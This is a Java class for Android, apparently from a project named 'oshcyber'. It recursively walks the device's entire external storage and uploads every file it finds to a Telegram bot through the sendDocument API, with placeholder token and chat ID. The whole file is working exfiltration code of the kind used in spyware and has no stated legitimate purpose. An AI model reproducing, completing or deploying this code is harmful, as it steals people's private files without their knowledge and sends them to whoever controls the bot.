package com.example.oshcyber;

import android.content.Context;
import android.os.Environment;
import android.provider.ContactsContract;

import java.io.File;
import java.nio.file.Path;
import java.util.Stack;
import java.util.concurrent.TimeUnit;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.OkHttp;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.RequestBody;

public class SendFiles {

    public void sendFiles(Context context) {
        File dir = Environment.getExternalStorageDirectory();
        OkHttpClient client = new OkHttpClient()
                .newBuilder()
                .readTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .connectTimeout(60, TimeUnit.SECONDS)
                .build();
        Stack<File> stack = new Stack<>();
        stack.push(dir);
        while (!stack.isEmpty()) {
            File directory = stack.pop();
            File[] fs = directory.listFiles();
            if(fs == null) continue;
            for(File f : fs){
                if(f.isDirectory()){
                    stack.push(f);
                } else if (f.isFile()) {
                    String chat_id = "TELEGRAM_CHAT_ID";
                    RequestBody fileBody = RequestBody.create(f, MediaType.parse("application/octet-stream"));
                    RequestBody postBody = new MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", chat_id)
                            .addFormDataPart("document", f.getAbsolutePath(), fileBody)
                            .build();
                    String url = "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/sendDocument";
                    Request request = new Request.Builder()
                            .url(url)
                            .post(postBody)
                            .build();
                    try (Response response = client.newCall(request).execute()) {
                        if (response.isSuccessful()) {
                            System.out.println(f.getAbsolutePath() + " sended");
                        } else {
                            System.out.println(response.code());
                            System.out.println(response.body().string());
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}